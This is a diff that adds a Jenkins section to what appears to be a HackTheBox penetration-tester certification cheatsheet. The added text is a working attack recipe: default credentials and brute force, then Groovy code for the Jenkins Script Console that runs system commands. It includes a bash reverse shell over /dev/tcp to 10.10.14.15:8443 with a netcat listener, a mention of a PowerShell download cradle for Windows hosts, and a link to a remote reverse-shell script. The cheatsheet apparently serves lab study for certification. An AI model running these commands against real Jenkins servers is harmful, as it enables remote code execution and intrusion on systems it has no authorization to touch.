@@ -87,6 +87,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
   	- [ColdFusion](#coldFusion)
   	- [IIS Tilde Enumeration](#iis-tilde-enumeration)
   	- [LDAP](#ldap)
+  	- [Jenkins](#jenkins)
 - [Useful Resources](#useful-resources)
 
 
@@ -2177,6 +2178,35 @@ OR
 OR
 	$username = "*"
 	$password ="*"
+```
+### Jenkins
+```
+1) Default Cred
+2) Bruteforce
+3) Script Console
+	--> http://jenkins.inlanefreight.local:8000/script
+	-->
+		def cmd = 'id'
+		def sout = new StringBuffer(), serr = new StringBuffer()
+		def proc = cmd.execute()
+		proc.consumeProcessOutput(sout, serr)
+		proc.waitForOrKill(1000)
+		println sout
+	--> Run
+
+	OR Reverse Shell
+	--> 
+		r = Runtime.getRuntime()
+		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+		p.waitFor()
+	--> nc -lvnp 8443
+
+	OR via windows
+	--> Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1. We could run commands on a Windows-based Jenkins install using this snippet:
+
+	OR via windows
+	--> https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
+
 ```
 ## Useful Resources
 
